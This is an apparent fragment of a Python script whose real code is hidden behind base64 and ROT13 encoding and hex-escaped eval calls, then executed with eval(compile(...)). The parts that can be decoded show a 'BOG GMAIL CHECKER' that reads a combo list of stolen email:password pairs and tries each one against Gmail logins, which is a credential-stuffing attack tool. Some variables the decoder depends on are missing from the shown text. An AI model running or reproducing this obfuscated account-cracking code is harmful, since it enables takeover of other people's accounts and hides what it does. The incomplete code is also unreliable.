oCiAgICAgICBfXy4uKV9fCiAgICAgLicgICAgICAgYCcuCiAgICAoIC0gLSAgICAgICAgYCkKICAgKCgnKSgnKSAgICAgICAgICkKICAgLyAgXiAgICAgICAgKSAgIHwKICAgXC4tLS4gICAgICAgICAgIHwKICAgIFwtLScgICAgICAgICAgLwogICAgIFxfXy4tJyBfXy4uJycKICAgICAgIC8gICAgIHwKICAiIiIpCiAgICB0eXBlc2NyKCJCT0cgR01BSUwgQ0hFQ0tFUiIpCiAgaW5pemlhbGUoKQogIGNvbnQgPSAwCiAgc3VjYyA9IDAKICBkaXJlbWFpbCA9IHJhd19pbnB1dCgiQ29tYm86ICIpCgogIGwgPSBvcGVuKGRpcmVtYWlsLCAiciIpCiAgZW0gPSBsLnJlYWRsaW5lcygpCiAgZW1haWwgPSBbXQogIHBhc3N3ID0gW10KICB'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))